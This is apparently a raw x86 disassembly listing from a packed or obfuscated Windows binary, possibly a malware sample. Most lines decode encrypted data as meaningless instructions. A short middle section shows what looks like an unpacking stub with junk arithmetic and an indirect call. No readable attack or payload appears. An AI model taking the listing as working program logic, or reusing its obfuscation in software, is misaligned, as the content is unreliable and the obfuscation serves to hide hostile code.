  40bbe5:	pop    ecx
  40bbe6:	fistp  WORD PTR [edi]
  40bbe9:	sbb    al,0x5f
  40bbeb:	push   edi
  40bbec:	rol    DWORD PTR [ebp+ecx*8-0x7ead0d2e],1
  40bbf3:	enter  0x5187,0xe0
  40bbf7:	les    ebp,FWORD PTR es:[ecx]
  40bbfa:	xor    DWORD PTR [ecx-0x5071de8f],esp
  40bc00:	es imul edi,esp,0x2f65b53a
  40bc07:	pop    eax
  40bc08:	hlt    
  40bc09:	pop    ds
  40bc0a:	pop    ss
  40bc0b:	test   eax,0xe12d9ec6
  40bc10:	fiadd  DWORD PTR [esi]
  40bc12:	inc    ecx
  40bc13:	out    dx,al
  40bc14:	mov    eax,ds:0xb58704e6
  40bc19:	cmp    al,0xf9
  40bc1b:	sbb    bl,BYTE PTR [eax-0x5c]
  40bc1e:	mov    eax,ds:0xa4c39b87
  40bc23:	(bad)  
  40bc24:	aam    0x49
  40bc26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc27:	mov    WORD PTR [edi-0x58],?
  40bc2a:	loope  0x40bbff
  40bc2c:	or     eax,0x9d2feef9
  40bc31:	nop
  40bc32:	sub    cl,bh
  40bc34:	(bad)  
  40bc36:	lock stc 
  40bc38:	add    al,0x66
  40bc3a:	les    esp,FWORD PTR [edi-0x47adbf60]
  40bc40:	adc    dh,cl
  40bc42:	repz and ah,ch
  40bc45:	mov    ebx,0xd2bd147b
  40bc4a:	aad    0x5a
  40bc4c:	call   0xe23d49c7
  40bc51:	mov    eax,0xdd291f68
  40bc56:	push   ebp
  40bc57:	sub    BYTE PTR [ebp+0x19fb277],cl
  40bc5d:	jp     0x40bc8c
  40bc5f:	imul   edi,DWORD PTR [edx+0x3e],0x996bf175
  40bc66:	cld    
  40bc67:	cmp    DWORD PTR [edx+eiz*8+0x7157fed7],ecx
  40bc6e:	xor    bh,BYTE PTR [esi]
  40bc70:	xor    edx,edx
  40bc72:	std    
  40bc73:	adc    bh,ch
  40bc75:	xor    al,0xa6
  40bc77:	enter  0x4fa9,0xf0
  40bc7b:	mov    bl,0xbe
  40bc7d:	ja     0x40bce3
  40bc7f:	sti    
  40bc80:	jnp    0x40bc2e
  40bc82:	lods   eax,DWORD PTR ds:[esi]
  40bc83:	dec    edx
  40bc84:	mov    dh,0xc
  40bc86:	shr    esi,0x29
  40bc89:	adc    bh,ah
  40bc8b:	push   ebx
  40bc8c:	dec    esi
  40bc8d:	mov    ebx,0x673a1782
  40bc92:	cmc    
  40bc93:	cmp    BYTE PTR [edi+eax*8],ch
  40bc96:	xchg   ecx,eax
  40bc97:	adc    dh,BYTE PTR [ebp+ecx*2-0x6b531a0b]
  40bc9e:	fstp   TBYTE PTR [ebx+0x45360c36]
  40bca4:	sti    
  40bca5:	cwde   
  40bca6:	or     edx,edx
  40bca8:	fdivp  st(6),st
  40bcaa:	stc    
  40bcab:	sub    bh,BYTE PTR [ebx+0x11]
  40bcae:	mov    bl,0x9d
  40bcb0:	sub    dh,BYTE PTR [ebp-0x504cdea8]
  40bcb6:	aad    0x53
  40bcb8:	pop    eax
  40bcb9:	sbb    al,dl
  40bcbb:	ja     0x40bca9
  40bcbd:	lea    eax,[edi-0x3782ff5f]
  40bcc3:	fst    QWORD PTR [eax+0x439e0e2d]
  40bcc9:	adc    DWORD PTR ds:0x15ea3683,eax
  40bccf:	push   0xfdd151ca
  40bcd4:	cmp    al,0x47
  40bcd6:	(bad)  
  40bcd7:	inc    edx
  40bcd8:	icebp  
  40bcd9:	enter  0x84a0,0x49
  40bcdd:	(bad)  
  40bcde:	repnz out 0x50,eax
  40bce1:	ss mov ah,0xbe
  40bce4:	xor    DWORD PTR [edi],esp
  40bce6:	iret   
  40bce7:	bound  eax,QWORD PTR [eax-0x70da1999]
  40bced:	add    edx,esi
  40bcef:	xor    bl,BYTE PTR [ebp-0x219254c9]
  40bcf5:	pop    esp
  40bcf6:	cs icebp 
  40bcf8:	fisubr DWORD PTR [edx+0x2487ef75]
  40bcfe:	dec    ebp
  40bcff:	xchg   ebx,eax
  40bd00:	jecxz  0x40bd69
  40bd02:	fsub   st(6),st
  40bd04:	fnstenv [edi+0x53]
  40bd07:	or     DWORD PTR [edx],ecx
  40bd09:	add    BYTE PTR [eax],ch
  40bd0b:	rcl    eax,1
  40bd0d:	push   ebx
  40bd0e:	dec    ecx
  40bd0f:	push   esp
  40bd10:	scas   eax,DWORD PTR es:[edi]
  40bd11:	add    al,0x2f
  40bd13:	fwait
  40bd14:	pop    esp
  40bd15:	sahf   
  40bd16:	retf   0x3702
  40bd19:	adc    al,0x75
  40bd1b:	imul   ebx,DWORD PTR [edi+ecx*8-0x4f],0x57ebbef3
  40bd23:	pop    edi
  40bd24:	jns    0x40bd2f
  40bd26:	rol    bh,cl
  40bd28:	rcr    edi,1
  40bd2a:	rcr    BYTE PTR [eax],1
  40bd2c:	imul   edx,DWORD PTR [esi-0x77],0x46
  40bd30:	sbb    DWORD PTR [ebx-0x35],ecx
  40bd33:	sub    al,0xac
  40bd35:	xor    ch,al
  40bd37:	(bad)  
  40bd39:	jmp    0x40bd5b
  40bd3b:	jmp    FWORD PTR [esi]
  40bd3d:	adc    eax,DWORD PTR [edi]
  40bd3f:	add    bl,cl
  40bd41:	pop    ss
  40bd42:	and    al,0x9f
  40bd44:	pause  
  40bd46:	(bad)  
  40bd47:	mov    DWORD PTR [eax-0x380e95b9],esp
  40bd4d:	call   0x57c9:0xd5d93cb6
  40bd54:	jp     0x40bd36
  40bd56:	add    BYTE PTR [eax+edi*4],ah
  40bd59:	retf   0xa973
  40bd5c:	pusha  
  40bd5d:	(bad)  
  40bd5e:	ret    
  40bd5f:	outs   dx,DWORD PTR ds:[esi]
  40bd60:	mov    cl,0x3f
  40bd62:	jp     0x40bd0a
  40bd64:	int    0x71
  40bd66:	sbb    dh,al
  40bd68:	jo     0x40bd72
  40bd6a:	pop    ecx
  40bd6b:	imul   edx,DWORD PTR [esi-0x1e],0x2dff1db0
  40bd72:	bound  edx,QWORD PTR [edi]
  40bd74:	rcl    BYTE PTR [eax+0x77],cl
  40bd77:	bound  edx,QWORD PTR [ebp-0x422a9835]
  40bd7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd7e:	and    ebp,0xfb61764f
  40bd84:	add    al,0x94
  40bd86:	push   edi
  40bd87:	dec    esp
  40bd88:	sub    al,0x45
  40bd8a:	add    eax,0xa8d04c3e
  40bd8f:	fsub   QWORD PTR [eax]
  40bd91:	pop    ss
  40bd92:	or     BYTE PTR [ecx+0x4b952fd0],ch
  40bd98:	test   BYTE PTR [edx-0x621dcf37],cl
  40bd9e:	jnp    0x40bd98
  40bda0:	or     ecx,DWORD PTR [ebx-0x25]
  40bda3:	jo     0x40bdab
  40bda5:	fistp  DWORD PTR [ecx-0x1bd1f881]
  40bdab:	cmp    al,BYTE PTR [ecx]
  40bdad:	cmp    edi,ebx
  40bdaf:	ja     0x40bd65
  40bdb1:	inc    edi
  40bdb2:	rcl    BYTE PTR [eax],cl
  40bdb4:	xchg   ebx,eax
  40bdb5:	mov    ebx,esp
  40bdb7:	loopne 0x40bdbf
  40bdb9:	out    0x26,eax
  40bdbb:	jmp    0x40bdf5
  40bdbd:	clc    
  40bdbe:	fwait
  40bdbf:	and    ah,BYTE PTR [eax-0x77c697ce]
  40bdc5:	hlt    
  40bdc6:	inc    ebp
  40bdc7:	dec    eax
  40bdc8:	mov    ch,0x8e
  40bdca:	mov    WORD PTR [ebx],fs
  40bdcc:	xlat   BYTE PTR ds:[ebx]
  40bdcd:	inc    eax
  40bdce:	xor    esi,ecx
  40bdd0:	xor    BYTE PTR [ebp+0x22],ch
  40bdd3:	aad    0xd8
  40bdd5:	add    eax,0xbdd2a579
  40bdda:	push   0x88d7c5b5
  40bddf:	pop    es
  40bde0:	mov    al,ds:0xa8a9d7b1
  40bde5:	stos   DWORD PTR es:[edi],eax
  40bde6:	loopne 0x40bd86
  40bde8:	or     al,0xb1
  40bdea:	mov    WORD PTR [edx],?
  40bdec:	data16 jnp 0x40be2f
  40bdef:	pop    eax
  40bdf0:	push   cs
  40bdf1:	shl    bl,cl
  40bdf3:	pop    esp
  40bdf4:	mov    ebx,0x4034befd
  40bdf9:	mov    DWORD PTR [ecx+ebx*4],edx
  40bdfc:	add    eax,0x9613e6f4
  40be01:	push   esi
  40be02:	lods   eax,DWORD PTR ds:[esi]
  40be03:	mov    ah,0xa3
  40be05:	mov    dh,0x4c
  40be07:	stos   BYTE PTR es:[edi],al
  40be08:	adc    BYTE PTR ds:0xa296afc2,0x94
  40be0f:	mov    BYTE PTR [ebx-0x22],cl
  40be12:	mov    esp,0xf5a359a5
  40be17:	cli    
  40be18:	and    esp,DWORD PTR [ebx+0x71]
  40be1b:	inc    ecx
  40be1c:	repnz sbb eax,0x479df6fe
  40be22:	aam    0x17
  40be24:	lock pop esp
  40be26:	push   edi
  40be27:	mov    al,ds:0x4e245969
  40be2c:	mov    ?,WORD PTR [edi+0x5]
  40be2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be30:	icebp  
  40be31:	xor    esi,DWORD PTR [ebx]
  40be33:	adc    al,0x1a
  40be35:	ja     0x40bdc4
  40be37:	push   ds
  40be38:	cmp    DWORD PTR [edi],0xa294843b
  40be3e:	repnz adc ah,BYTE PTR [ecx]
  40be41:	xchg   edx,eax
  40be42:	ror    DWORD PTR [esi],1
  40be44:	push   ecx
  40be45:	cmp    esp,ebp
  40be47:	clc    
  40be48:	sub    dl,BYTE PTR [eax+0x26009a5e]
  40be4e:	mov    bh,0x8d
  40be50:	jle    0x40bebf
  40be52:	(bad)  
  40be53:	fidivr WORD PTR [edi+edi*8+0x6165e8c0]
  40be5a:	cmp    dl,BYTE PTR [ecx]
  40be5c:	repz jno 0x40be91
  40be5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be60:	push   ecx
  40be61:	ja     0x40bedc
  40be63:	jbe    0x40be83
  40be65:	inc    edx
  40be66:	lock in al,dx
  40be68:	pop    esi
  40be69:	test   BYTE PTR [edx-0x46e224af],ah
  40be6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be70:	push   edi
  40be71:	and    eax,0x56709f90
  40be76:	fsub   DWORD PTR [edx+0x45f6ae89]
  40be7c:	cmp    BYTE PTR [ebp+ecx*2+0x22],cl
  40be80:	cmc    
  40be81:	neg    BYTE PTR [edi-0x3b6e6cd]
  40be87:	jo     0x40bedc
  40be89:	ins    DWORD PTR es:[edi],dx
  40be8a:	and    bl,bl
  40be8c:	call   0xf9e2:0x80511fb4
  40be93:	addr16 mov bh,0xd2
  40be96:	inc    esi
  40be97:	push   eax
  40be98:	adc    eax,DWORD PTR [edx-0x1fe75f15]
  40be9e:	pop    edx
  40be9f:	ficomp DWORD PTR [edi]
  40bea1:	push   es
  40bea2:	loop   0x40bea2
  40bea4:	push   ss
  40bea5:	inc    ebp
  40bea6:	inc    esp
  40bea7:	sub    eax,DWORD PTR [ecx]
  40bea9:	adc    eax,0x8d23c11
  40beae:	pop    ss
  40beaf:	loope  0x40be3c
  40beb1:	jge    0x40bebb
  40beb3:	mov    eax,ds:0x424435
  40beb8:	mov    DWORD PTR ds:0x420e9e,0x18
  40bec2:	cmp    DWORD PTR ds:0x420e9e,0x0
  40bec9:	je     0x40bf28
  40becf:	cmp    DWORD PTR ds:0x420e9e,0x8
  40bed6:	jne    0x40befa
  40bedc:	push   DWORD PTR [ebp-0xc]
  40bedf:	push   0x420e7e
  40bee4:	push   0x29f3
  40bee9:	push   0x424044
  40beee:	push   DWORD PTR [ebp-0x18]
  40bef1:	push   DWORD PTR [ebp-0x24]
  40bef4:	call   DWORD PTR ds:0x42480d
  40befa:	cmp    DWORD PTR ds:0x420e9e,0x9
  40bf01:	jne    0x40bf16
  40bf07:	xor    edx,edx
  40bf09:	xor    edx,DWORD PTR ds:0x420e9e
  40bf0f:	dec    edx
  40bf10:	mov    DWORD PTR ds:0x420e9e,edx
  40bf16:	mov    edx,DWORD PTR ds:0x420e9e
  40bf1c:	dec    edx
  40bf1d:	mov    DWORD PTR ds:0x420e9e,edx
  40bf23:	jmp    0x40bec2
  40bf28:	mov    eax,DWORD PTR [eax+0x198]
  40bf2e:	or     DWORD PTR ds:0x422010,edx
  40bf34:	xor    edi,ecx
  40bf36:	xor    DWORD PTR ds:0x420f00,edx
  40bf3c:	mov    edx,0x3272dd
  40bf41:	or     DWORD PTR ds:0x420f08,0x420e96
  40bf4b:	add    edi,edx
  40bf4d:	mov    DWORD PTR ds:0x420e8e,0x537
  40bf57:	cmp    DWORD PTR [eax],edi
  40bf59:	je     0x40bf70
  40bf5f:	mov    DWORD PTR ds:0x420f08,0x7795
  40bf69:	mov    eax,DWORD PTR [eax]
  40bf6b:	jmp    0x410a15
  40bf70:	mov    DWORD PTR ds:0x420fb4,0x165d
  40bf7a:	mov    eax,DWORD PTR [ebp+0x18]
  40bf7d:	cmp    eax,esi
  40bf7f:	mov    DWORD PTR ds:0x420eec,0x5796
  40bf89:	jne    0x40bf99
  40bf8f:	push   0xf89c85b2
  40bf94:	jmp    0x410a04
  40bf99:	mov    esi,DWORD PTR [ebp+0x18]
  40bf9c:	mov    eax,0xf89c85b3
  40bfa1:	mov    DWORD PTR ds:0x420e96,0x5b0e
  40bfab:	cmp    esi,eax
  40bfad:	jne    0x4109f4
  40bfb3:	mov    eax,ds:0x420ea2
  40bfb8:	or     eax,DWORD PTR ds:0x420ef4
  40bfbe:	mov    ds:0x420ea2,eax
  40bfc3:	mov    eax,DWORD PTR [ebp+0x10]
  40bfc6:	xor    eax,ecx
  40bfc8:	sub    DWORD PTR ds:0x420e96,0x168d
  40bfd2:	add    eax,edx
  40bfd4:	mov    esi,DWORD PTR ds:0x420ef4
  40bfda:	and    DWORD PTR ds:0x420f5c,esi
  40bfe0:	mov    DWORD PTR [ebp-0x18],eax
  40bfe3:	neg    esi
  40bfe5:	mov    eax,DWORD PTR [ebp+0xc]
  40bfe8:	mov    esi,DWORD PTR [ebp-0x8]
  40bfeb:	xor    DWORD PTR ds:0x420f00,0x766d
  40bff5:	xor    eax,ecx
  40bff7:	sbb    DWORD PTR ds:0x420e86,0x420e8a
  40c001:	jmp    0x40e37b
  40c006:	push   ebp
  40c007:	mov    ds:0xbb7be978,al
  40c00c:	not    DWORD PTR [esi+0x4b1ebfc]
  40c012:	test   DWORD PTR [edx+0x4e],esp
  40c015:	addr16 aam 0xe9
  40c018:	jp     0x40c094
  40c01a:	sbb    DWORD PTR [edi+0x7a],ebx
  40c01d:	jp     0x40c00d
  40c01f:	in     eax,dx
  40c020:	push   eax
  40c021:	xor    eax,0x86c40d2
  40c026:	(bad)  
  40c027:	in     eax,dx
  40c028:	jmp    0xd2a85b09
  40c02d:	or     esi,DWORD PTR [edx+0x5d]
  40c030:	popf   
  40c031:	jns    0x40c000
  40c033:	js     0x40c019
  40c035:	sti    
  40c036:	mov    ecx,0xc131cece
  40c03b:	leave  
  40c03c:	push   ebx
  40c03d:	aaa    
  40c03e:	and    al,0xb9
  40c040:	mov    al,0x56
  40c042:	lock sub edx,DWORD PTR [ebp-0x15]
  40c046:	std    
  40c047:	or     esp,DWORD PTR [edi]
  40c049:	inc    esi
  40c04a:	loope  0x40c0a1
  40c04c:	cli    
  40c04d:	push   DWORD PTR [eax+0x6e3db393]
  40c053:	in     eax,dx
  40c054:	mov    esi,0x5647eab9
  40c059:	pop    ebp
  40c05b:	pushf  
  40c05c:	push   es
  40c05d:	test   al,0xb7
  40c05f:	and    edi,0xbfc7408c
  40c065:	fimul  WORD PTR [ecx-0x419698ce]
  40c06b:	(bad)  
  40c06c:	ds gs xchg edi,eax
  40c06f:	jg     0x40c0db
  40c071:	mov    cl,0x88
  40c073:	add    eax,0x67c9e6a4
  40c078:	inc    ecx
  40c079:	shl    bl,cl
  40c07b:	fild   WORD PTR [edx+0x0]
  40c07e:	adc    BYTE PTR [eax-0x7d],cl
  40c081:	jl     0x40c05e
  40c083:	lahf   
  40c084:	lock xchg edi,eax
  40c086:	mov    bh,0x7c
  40c088:	xchg   ebp,eax
  40c089:	push   edi
  40c08a:	add    al,BYTE PTR [edi]
  40c08c:	cmp    bl,BYTE PTR [edx-0x980b526]
  40c092:	xchg   edx,eax
  40c093:	sti    
  40c094:	call   0x4e730301
  40c099:	(bad)  
  40c09b:	jge    0x40c0b3
  40c09d:	adc    eax,0x175919bd
  40c0a2:	mov    DWORD PTR [ebx-0x2c7c4228],ebx
  40c0a8:	sbb    BYTE PTR [esi+eax*1-0x32],ah
  40c0ac:	pop    eax
  40c0ad:	and    eax,0xf66e04ae
  40c0b2:	fs inc esi
  40c0b4:	mov    al,0x62
  40c0b6:	adc    BYTE PTR [ebx-0x1daf2ba6],ah
  40c0bc:	scas   eax,DWORD PTR es:[edi]
  40c0bd:	aam    0xab
  40c0bf:	loop   0x40c054
  40c0c1:	jmp    0x40c0cd
  40c0c3:	adc    eax,0x4812c18c
  40c0c8:	mov    eax,0xae027e
  40c0cd:	call   0x57d1:0xc6cc32ab
  40c0d4:	mov    WORD PTR [esi+0x777756be],?
  40c0da:	pop    edi
  40c0db:	std    
  40c0dc:	adc    eax,0xa78c92ea
  40c0e1:	cwde   
  40c0e2:	mov    ds:0x6de14557,al
  40c0e7:	and    dh,BYTE PTR [eax-0x7f43bcf7]
  40c0ed:	fimul  DWORD PTR [ecx-0x218a0067]
  40c0f3:	pushf  
  40c0f4:	out    dx,eax
  40c0f5:	lds    ebx,FWORD PTR fs:[esp+ebx*4]
  40c0f9:	retf   0x15ea
  40c0fc:	in     eax,dx
  40c0fd:	popa   
  40c0fe:	cs in  eax,0xa8
  40c101:	outs   dx,DWORD PTR ds:[esi]
  40c102:	pop    ecx
  40c103:	std    
  40c104:	repz repnz add al,0x62
  40c108:	pop    ss
  40c109:	mov    BYTE PTR [edx],bh
  40c10b:	ins    BYTE PTR es:[edi],dx
  40c10c:	outs   dx,DWORD PTR ds:[esi]
  40c10d:	mov    esp,0x736fbfa9
  40c112:	lods   al,BYTE PTR ds:[esi]
  40c113:	push   cs
  40c114:	rcr    DWORD PTR [esi+0x42],1
  40c117:	inc    edi
  40c118:	mov    WORD PTR [ecx],?
  40c11a:	sbb    al,0x5d
  40c11c:	sub    eax,esi
  40c11e:	xchg   edi,eax
  40c11f:	inc    edi
  40c120:	scas   al,BYTE PTR es:[edi]
  40c121:	mov    eax,ds:0xd9a3e739
  40c126:	or     ah,al
  40c128:	xor    al,0xf5
  40c12a:	int3   
  40c12b:	inc    ecx
  40c12c:	cs mov esp,0x8c4f3e51
  40c132:	arpl   WORD PTR [esi+0xff50980],si
  40c138:	jle    0x40c0cb
  40c13a:	cmp    al,0x7f
  40c13c:	mov    eax,ds:0x4fdbb5df
  40c141:	mov    al,0x7f
  40c143:	jae    0x40c1a3
  40c145:	push   esp
  40c146:	sbb    eax,0xec0dfe9e
  40c14b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c14c:	sub    DWORD PTR [eax],esi
  40c14e:	pop    eax
  40c14f:	shl    DWORD PTR [ebp+0x6c1e1338],0x88
  40c156:	fadd   DWORD PTR [ecx+0x12]
  40c159:	cld    
  40c15a:	mov    esi,0x3c0e237
  40c15f:	mov    edi,0xc70828dc
  40c164:	mov    BYTE PTR [esi],ch
  40c166:	pop    ebx
  40c167:	ja     0x40c1c8
  40c169:	add    BYTE PTR [edx],bh
  40c16b:	cdq    
  40c16c:	cmp    eax,DWORD PTR gs:[edi-0x3103391e]
  40c173:	stos   DWORD PTR es:[edi],eax
  40c174:	cli    
  40c175:	jle    0x40c186
  40c177:	sbb    bh,BYTE PTR [ecx]
  40c179:	ds inc edx
  40c17b:	pop    ebp
  40c17c:	ins    BYTE PTR es:[edi],dx
  40c17d:	mov    BYTE PTR [ecx+0xf55c22c],bh
  40c183:	jmp    0x4307:0x9bccdfa9
  40c18a:	mov    edi,0x2263cc9
  40c18f:	and    al,0x3b
  40c191:	jmp    0x4ad5:0x92b5c7ec
  40c198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c199:	and    al,0xac
  40c19b:	xchg   esi,eax
  40c19c:	sahf   
  40c19d:	push   ebp
  40c19e:	or     BYTE PTR [edi+0x0],ch
  40c1a1:	xchg   BYTE PTR [ecx+0x50],bl
  40c1a4:	push   ebx
  40c1a5:	xor    al,0xaa
  40c1a7:	cwde   
  40c1a8:	xchg   ecx,eax
  40c1a9:	push   ss
  40c1aa:	mov    es,WORD PTR fs:[ebx-0x70]
  40c1ae:	cmp    BYTE PTR [eax+0xb833082],dl
  40c1b4:	mov    dh,0xd4
  40c1b6:	sbb    al,0xc1
  40c1b8:	in     eax,dx
  40c1b9:	retf   0xf4d7
  40c1bc:	xlat   BYTE PTR ds:[ebx]
  40c1bd:	cmp    BYTE PTR [edi-0xb646aca],bl
  40c1c3:	adc    al,0x53
  40c1c5:	call   0x62c76bdf
  40c1ca:	push   edx
  40c1cb:	add    edx,DWORD PTR [eax]
  40c1cd:	mov    bl,0x27
  40c1cf:	(bad)  
  40c1d0:	mov    al,dh
  40c1d2:	retf   0x1aae
  40c1d5:	fxch   st(0)
  40c1d7:	ficom  WORD PTR [ebp-0x33f43133]
  40c1dd:	shl    ebx,0x1e
  40c1e0:	cmp    DWORD PTR [edx],esi
  40c1e2:	jmp    0x6bc5:0xb45aef3e
  40c1e9:	or     ch,dl
  40c1eb:	push   cs
  40c1ec:	or     dl,BYTE PTR [eax+0x7fd3b07f]
  40c1f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1f3:	mov    ds:0xfcb4a500,al
  40c1f8:	scas   al,BYTE PTR es:[edi]
  40c1f9:	fs retf 
  40c1fb:	js     0x40c1b4
  40c1fd:	xlat   BYTE PTR ds:[ebx]
  40c1fe:	cwde   
  40c1ff:	pop    ecx
  40c200:	ins    DWORD PTR es:[edi],dx
  40c201:	nop
  40c202:	sahf   
  40c203:	add    eax,0xda823710
  40c208:	push   eax
  40c209:	aaa    
  40c20a:	mov    BYTE PTR [edi],ch
  40c20c:	jb     0x40c1f5
  40c20e:	rcl    ch,0xd2
  40c211:	push   ss
  40c212:	loopne 0x40c250
  40c214:	mov    edi,0x3003f622
  40c219:	shl    DWORD PTR [edx+eiz*8],1
  40c21c:	xlat   BYTE PTR ds:[ebx]
  40c21d:	enter  0x83dc,0x7a
  40c221:	test   DWORD PTR [edi+0x72e5bf8a],esp
  40c227:	or     eax,0x9442c380
  40c22c:	mov    bh,0xfa
  40c22e:	test   eax,0x24d72323
  40c233:	inc    esi
  40c234:	mov    edi,0x50ae479
  40c239:	xor    esp,DWORD PTR [esi-0x48]
  40c23c:	retf   0x2cd4
  40c23f:	xchg   esi,eax
  40c240:	xchg   BYTE PTR [edx-0x1343dbfb],bl
  40c246:	push   eax
  40c247:	jle    0x40c2a8
  40c249:	fwait
  40c24a:	ret    0x5577
  40c24d:	sar    BYTE PTR [eax+0x1a57f84],0xc7
  40c254:	(bad)  
  40c255:	pop    esi
  40c256:	lods   eax,DWORD PTR ds:[esi]
  40c257:	push   esi
  40c258:	push   eax
  40c259:	sbb    eax,0x71bdd5e7
  40c25e:	push   edx
  40c25f:	jbe    0x40c27f
  40c261:	push   0x32eb898c
  40c266:	aam    0xf9
  40c268:	xor    al,0x75
  40c26a:	fld    QWORD PTR [esi+0x3151c0fa]
  40c270:	stos   DWORD PTR es:[edi],eax
  40c271:	push   0x77
  40c273:	js     0x40c2bf
  40c275:	idiv   esp
  40c277:	push   eax
  40c278:	(bad)  
  40c27a:	into   
  40c27b:	leave  
  40c27c:	jns    0x40c23a
  40c27e:	xchg   esp,eax
  40c27f:	(bad)  
  40c280:	mov    ds:0xe502a23,eax
  40c285:	icebp  
  40c286:	sub    dl,BYTE PTR [ebx+edi*8]
  40c289:	cmp    cl,0xf8
  40c28c:	pop    edx
  40c28d:	jns    0x40c27e
  40c28f:	je     0x40c225
  40c291:	gs hlt 
  40c293:	jmp    0x40c251
  40c295:	xchg   esi,eax
  40c296:	dec    ebx
  40c297:	test   al,0xd5
  40c299:	mov    eax,ds:0xd5574ebe
  40c29e:	leave  
  40c29f:	jbe    0x40c233
  40c2a1:	jo     0x40c23c
  40c2a3:	outs   dx,BYTE PTR ds:[esi]
  40c2a4:	ss ja  0x40c306
  40c2a7:	mul    al
  40c2a9:	sbb    al,0x21
  40c2ab:	sub    al,ch
  40c2ad:	mov    WORD PTR [edx-0x2b],es
  40c2b0:	(bad)  
  40c2b1:	(bad)  
  40c2b2:	(bad)  
  40c2b3:	push   ss
  40c2b4:	mov    eax,0xeef9376f
  40c2b9:	repz cli 
  40c2bb:	test   DWORD PTR [eax+0x23060862],edx
  40c2c1:	push   cs
  40c2c2:	stos   BYTE PTR es:[edi],al
  40c2c3:	nop
  40c2c4:	mov    ds:0x84e2e2db,al
  40c2c9:	test   al,0x4d
  40c2cb:	je     0x40c310
  40c2cd:	hlt    
  40c2ce:	sub    cl,BYTE PTR [ebp+0x1992218f]
  40c2d4:	enter  0x1cd,0xf9
  40c2d8:	pop    ss
  40c2d9:	add    DWORD PTR [ecx],edx
  40c2db:	ds jge 0x40c2f5
  40c2de:	scas   eax,DWORD PTR es:[edi]
  40c2df:	stos   BYTE PTR es:[edi],al
  40c2e0:	pop    eax
  40c2e1:	and    DWORD PTR [edi+0x8e6bc54],0xf965b3eb
  40c2eb:	leave  
  40c2ec:	test   BYTE PTR ds:0x159621c2,bl
  40c2f2:	mov    bh,0x8a
  40c2f4:	lods   al,BYTE PTR ds:[esi]
  40c2f5:	loopne 0x40c291
  40c2f7:	push   ss
  40c2f8:	std    
  40c2f9:	cdq    
  40c2fa:	pop    esi
  40c2fb:	and    DWORD PTR [esi],ebx
  40c2fd:	sbb    cl,BYTE PTR [eax-0xb3e5209]
  40c303:	data16 sub al,0x65
  40c306:	fwait
  40c307:	test   DWORD PTR [ecx],eax
  40c309:	sbb    al,0x2a
  40c30b:	xor    ch,ch
  40c30d:	push   0x38c21320
  40c312:	pop    ebx
  40c313:	dec    ecx
  40c314:	jg     0x40c2e9
  40c316:	int3   
  40c317:	mov    esi,0xee8c626b
  40c31c:	into   
  40c31d:	push   ds
  40c31e:	mov    ch,0x79
  40c320:	ret    0xce1f
  40c323:	pop    edi
  40c324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c325:	mov    edi,DWORD PTR [ebp+ebx*2-0x66]
  40c329:	dec    eax
  40c32a:	mov    ecx,0x6f57f8cb
  40c32f:	sbb    ch,BYTE PTR [ebx+0x3508bbc5]
  40c335:	mov    esi,0xd170a8eb
  40c33a:	pop    es
  40c33b:	test   eax,0xa5822b5a
  40c340:	fcom   DWORD PTR [eax]
  40c342:	mov    esp,0x9ce485a3
  40c347:	push   edx
  40c348:	push   es
  40c349:	mov    ah,0xdf
  40c34b:	(bad)  
  40c34c:	sub    al,0xd0
  40c34e:	pop    esi
  40c34f:	add    eax,0x14ac3001
  40c354:	push   ss
  40c355:	outs   dx,BYTE PTR ds:[esi]
  40c356:	mov    WORD PTR [ebx],ss
  40c358:	in     eax,0xc8
  40c35a:	ins    BYTE PTR es:[edi],dx
  40c35b:	dec    esp
  40c35c:	xchg   bh,ah
  40c35e:	jle    0x40c359
  40c360:	lock mov edx,0x97f1a521
  40c366:	dec    esi
  40c367:	push   ss
  40c368:	fwait
  40c369:	mov    ds:0x36430f81,eax
  40c36e:	mov    ecx,0xe6de4d8
  40c373:	xor    DWORD PTR [edx+ecx*2+0xe],edx
  40c377:	xchg   edx,eax
  40c378:	test   eax,0xe62876d6
  40c37d:	aad    0xde
  40c37f:	adc    edi,DWORD PTR [eax+0x258a3c77]
  40c385:	sbb    ah,BYTE PTR [edi]
  40c387:	gs pop eax
  40c389:	xor    DWORD PTR [edi-0x5],ebp
  40c38c:	xor    eax,0xda9a60be
  40c391:	rcl    BYTE PTR [esi*4-0x19d3e935],cl
  40c398:	iret   
  40c399:	pop    ss
  40c39a:	sub    dl,BYTE PTR [edx+0x11]
  40c39d:	bound  edx,QWORD PTR ds:0xbfcd6fdd
  40c3a3:	mov    dl,0x3a
  40c3a5:	ds test ecx,0xbf34ee0a
  40c3ac:	pop    edx
  40c3ad:	das    
  40c3ae:	mov    dh,0x37
  40c3b0:	dec    esi
  40c3b1:	test   eax,0x38d6b7f8
  40c3b6:	fs push ss
  40c3b8:	mov    ebp,0x1c34eb56
  40c3bd:	sar    BYTE PTR [eax+0x7c732dd3],cl
  40c3c3:	cwde   
  40c3c4:	daa    
  40c3c5:	mov    esp,eax
  40c3c7:	push   eax
  40c3c8:	dec    esi
  40c3c9:	xchg   esp,eax
  40c3ca:	cmp    al,bh
  40c3cc:	or     cl,BYTE PTR ds:0x6bb9e46e
  40c3d2:	jbe    0x40c363
  40c3d4:	shl    BYTE PTR [edi-0x56],cl
  40c3d7:	retf   
  40c3d8:	ss push edx
  40c3da:	inc    ecx
  40c3db:	ret    0x8c68
  40c3de:	fs push ecx
  40c3e0:	inc    ebx
  40c3e1:	std    
  40c3e2:	xor    al,0x91
  40c3e4:	stos   BYTE PTR es:[edi],al
  40c3e5:	rcr    DWORD PTR [edi],0xa8
  40c3e8:	mov    esi,0x56be890c
  40c3ed:	inc    edx
  40c3ee:	lods   al,BYTE PTR ds:[esi]
  40c3ef:	cli    
  40c3f0:	out    0x4e,al
  40c3f2:	test   BYTE PTR [eax+0x2a],bl
  40c3f5:	les    ecx,FWORD PTR [ecx+esi*8-0x35e5bb0]
  40c3fc:	cmp    dl,BYTE PTR [edi-0x504f9985]
  40c402:	shr    BYTE PTR [ecx+0x7b],0xc0
